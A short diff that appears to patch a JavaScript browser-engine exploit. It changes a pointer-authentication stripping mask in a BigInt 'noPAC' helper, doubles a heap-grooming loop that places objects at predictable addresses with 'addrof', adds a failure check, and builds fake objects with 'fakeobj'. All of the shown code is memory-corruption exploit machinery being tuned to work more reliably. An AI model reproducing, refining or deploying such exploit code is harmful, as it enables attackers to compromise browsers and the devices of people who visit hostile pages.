@@ -177,7 +177,7 @@ self[1] = boxed_arr;
     return f64[0];
   };
   BigInt.prototype.noPAC = function () {
-    return this & 0x7fffffffffn;
+    return this & 0xffffffffffn;
   };
   BigInt.prototype.add = function (other) {
     return this + other;
@@ -301,7 +301,7 @@ self[1] = boxed_arr;
           let scribble_element;
           let scribbles = [];
           let prev_addr = 0n;
-          for (let i = 0; i < 500; ++i) {
+          for (let i = 0; i < 1000; ++i) {
             let o = {
               p1: 1.1,
               p2: 2.2
@@ -312,6 +312,10 @@ self[1] = boxed_arr;
             }
             scribbles.push(o);
             prev_addr = p.addrof(o);
+          }
+          if (!scribble_element) {
+            print("scribble_element: allocation stride miss after 1000 attempts");
+            throw new Error("scribble_element allocation failed");
           }
           let change_scribble_holder = {
             p1: p.fakeobj(0x108240700000000n),
